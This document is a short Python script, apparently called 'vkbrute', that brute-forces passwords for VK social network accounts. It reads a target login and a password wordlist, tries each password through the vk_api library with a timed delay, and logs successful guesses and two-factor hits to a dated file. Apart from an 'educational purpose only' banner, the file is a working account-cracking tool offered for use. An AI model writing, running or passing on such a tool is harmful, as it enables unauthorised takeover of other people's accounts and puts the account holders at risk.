import vk_api
import time
import datetime
from datetime import date

def banner():
    banner = """
       __    __            __     
 _  __/ /__ / /  ______ __/ /____ 
| |/ /  '_// _ \/ __/ // / __/ -_)
|___/_/\_\/_.__/_/  \_,_/\__/\__/ 
                                  
"""
    print(banner)
    print('Warning!')
    print('This tool is educational purpose only!')

def main():
    login = input('Login> ') or None
    wordlist = input('Wordlist> ') or None
    timeout = input('Timeout (default: 5)> ') or 5
    if(wordlist != None): passwrd = open(wordlist, 'r')
    else:
        print ('Error: Empty wordlist var')
        exit()
    for i in passwrd:
        try:
            i = i[:-1]
            print(i)
            session = vk_api.VkApi(login, i)
            session.auth()
            session.get_api()
            print('Success! Password: ', i)
            with open(f'logs/log-{str(date.today())}.log', 'a') as f:
                f.write(f'{login}\t{i}\tSuccess\n')
                f.close()
            exit()
        except vk_api.AuthError as error:
            print(error)
            if(str(error) == 'No handler for two-factor authentication'): 
                print('Quitting! Correct password but no handler for two-factor auth')
                with open(f'logs/log-{str(date.today())}.log', 'a') as f:
                    f.write(f'{login}\t{i}\t2fa error\n')
                    f.close()
                exit()
        time.sleep(int(timeout))
banner()
main()
